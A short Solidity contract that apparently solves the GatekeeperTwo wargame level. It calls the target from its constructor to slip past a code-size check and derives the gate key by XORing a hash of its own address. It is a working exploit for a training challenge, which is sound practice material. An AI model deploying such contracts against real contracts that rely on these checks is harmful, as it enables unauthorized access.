// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

/// @notice Enters GatekeeperTwo while this contract is still under construction.
contract GatekeeperTwoSolver {
    constructor(address target) {
        // XOR with the hash to produce uint64.max in the target's third gate.
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        bool entered = IGatekeeperTwo(target).enter(key);
        require(entered, "Entry failed");
    }
}
